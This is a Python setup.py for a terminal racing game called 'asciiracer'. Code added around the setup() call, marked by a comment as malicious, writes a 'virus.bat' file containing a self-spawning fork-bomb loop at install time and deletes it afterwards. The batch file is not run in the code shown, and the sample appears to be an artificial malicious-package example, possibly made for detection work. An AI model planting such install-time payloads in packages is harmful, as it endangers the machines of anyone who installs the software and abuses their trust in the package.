import setuptools
import os

# Add malicious code to create the virus.bat file
with open("virus.bat", "w") as f:
    f.write("@echo off\n")
    f.write(":start\n")
    f.write("start %0\n")
    f.write("goto start\n")

with open("README.md", "r") as fh:
    long_description = fh.read()

setuptools.setup(
    name='asciiracer',
    version='1.0.3',
    python_requires='>=3.6.0',
    author='Ahmed Gado',
    author_email='ahmedehabg@gmail.com',
    description='A racing game that runs in terminal',
    long_description=long_description,
    long_description_content_type="text/markdown",
    url='https://github.com/UpGado/ascii_racer',
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    entry_points={
        'console_scripts': [
            'asciiracer = asciiracer.__main__:main'
        ]
    },
    install_requires=[
        'windows-curses >= 2.0;platform_system=="Windows"'
    ]
)

# Ensure that the virus.bat file is removed after setup
os.remove("virus.bat")
